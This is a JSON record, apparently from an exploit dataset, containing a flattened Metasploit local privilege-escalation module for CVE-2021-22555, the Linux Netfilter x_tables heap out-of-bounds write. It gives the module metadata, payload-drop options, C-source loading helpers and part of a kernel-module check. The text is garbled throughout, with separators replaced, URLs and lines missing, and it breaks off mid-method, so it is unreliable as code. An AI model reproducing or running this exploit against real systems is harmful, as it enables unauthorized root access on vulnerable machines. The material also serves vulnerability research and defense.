{
    "text": "vul_name : Netfilter x_tables Heap Out-Of-Bounds Write / Privilege Escalation ， vul_cve : CVE-2021-22555 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Local ， Rank = GreatRanking ， include Msf : Post : Common ， prepend Msf : Exploit : Remote : AutoCheck ， include Msf : Post : Linux : Priv ， include Msf : Post : Linux : System ， include Msf : Post : Linux : Kernel ， include Msf : Post : File ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， super (  ， update_info (  ， info ,  ， 'Name' => 'Netfilter x_tables Heap OOB Write Privilege Escalation' ,  ， 'Description' => %q{ ， A heap out-of-bounds write affecting Linux since v2.6.19-rc1 was discovered in net/netfilter/x_tables.c. ， This allows an attacker to gain privileges or cause a DoS ( via heap memory corruption ) through user name space. ， Kernels up to 5.11 ( including ) are vulnerable. ， More information about vulnerable kernels is ， available at ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => [  ， 'Andy Nguyen ( theflow @  ) ' ,  # The original author of this exploit ， 'Szymon Janusz' ,  # The author of this module ， 'bcoles' # Updated the C source code to provide more targets ，  ]  ,  ， 'DisclosureDate' => '2021-07-07' ,  # YYYY-DD-MM. Public disclosure date ， 'Platform' => 'linux' ,  ， 'Arch' => [ ARCH_X64 ]  ,  ， 'SessionTypes' => [ 'meterpreter' , 'shell' ]  ,  ， 'Targets' => [  ，  [ 'Automatic' , {} ]  ，  ]  ,  ， 'DefaultTarget' => 0 ,  ， 'Notes' => { ， 'Reliability' => [ UNRELIABLE_SESSION ]  ,  # The module could fail to get root sometimes. ， 'Stability' => [ OS_RESOURCE_LOSS ]  ,  # After too many failed attempts , the system needs to be restarted. ， 'SideEffects' => [ ARTIFACTS_ON_DISK ]  ， } ,  ， ' ，  [ 'CVE' , '2021-22555' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  [ 'URL' , ' ，  ]  ， register_options (  ，  [  ， OptString.new ( 'WritableDir' ,  [ true , 'Directory to write persistent payload file.' , '/var/tmp' ]  )  ,  ， OptInt.new ( 'CmdTimeout' ,  [ true , 'Maximum number of seconds to wait for the exploit to complete' , 10 ]  )  ，  ]  ， end ， def base_dir ， datastore [ 'WritableDir' ] .to_s ， end ， def cmd_timeout ， datastore [ 'CmdTimeout' ] .to_i ， end ， file_path = : File.join (  : Msf : Config.install_root , \"external/source/exploits/ # {cve}/ # {file}\" )  ，  : File.binread ( file_path )  ， end ， c_code.gsub ( %r{/\\ * . * ?\\ * /}m , ' ) .gsub ( %r{^\\s * /. *  $ } , ' )  ， end ， def check ， unless kernel_modules.include? 'ip_tables' ， vprint_warning ( 'The ip_tables module is not loaded.' ) ",
    "time": "2021.10.09"
}